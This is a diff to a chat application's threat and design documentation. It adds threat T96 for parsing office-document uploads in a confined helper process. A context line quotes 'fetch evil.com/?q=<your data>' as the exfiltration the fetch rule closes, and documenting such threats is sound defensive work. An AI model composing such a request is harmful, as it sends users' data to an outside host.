@@ -819,6 +819,7 @@ Each row's full text is in `docs/threats/`.
 | [T93](docs/threats/T93.md) | **A person's bookmark on a message is one more event the owner's click writes into a chat's log**… |
 | [T94](docs/threats/T94.md) | **A person's file the model cannot read is written into a chat's folder by the node**… |
 | [T95](docs/threats/T95.md) | **A person's file the model cannot read is parsed by the master for an agent in a chat that has no folder**… |
+| [T96](docs/threats/T96.md) | **A person's Word, Excel, PowerPoint or OpenDocument file is parsed so that the model can read its text**… |
 
 Numbers T15 and T31 were never used; rows are never renumbered.
 
@@ -1422,8 +1423,10 @@ summary, incognito TTL).
   never one the model composed (closes "fetch evil.com/?q=<your data>"). Pages become
   text (html2text), capped at 2 MB read / 20k characters.
 * **Attachments**: `+` in the bar uploads text, code, Markdown, CSV, JSON or PDF (text
-  layer). Text is extracted on the master (PDFs in the confined `pdf-text` helper
-  process since FIX_PLAN 3.4, T23), capped at 100k characters, and travels *inside* the
+  layer), Word, Excel, PowerPoint or OpenDocument file (X.55, T96: the same helper
+  mode, `doc-text`; the file is kept as well). Text is extracted on the master (PDFs and
+  documents in the confined `pdf-text` and `doc-text` helper
+  processes since FIX_PLAN 3.4, T23), capped at 100k characters, and travels *inside* the
   `user_message` event so the log alone rebuilds what the model saw. Uploads are owned,
   single-use, and expire unsent after the incognito TTL.
 * **Token meter**: `turn_ended.usage` gains `context_tokens` (input of the turn's last
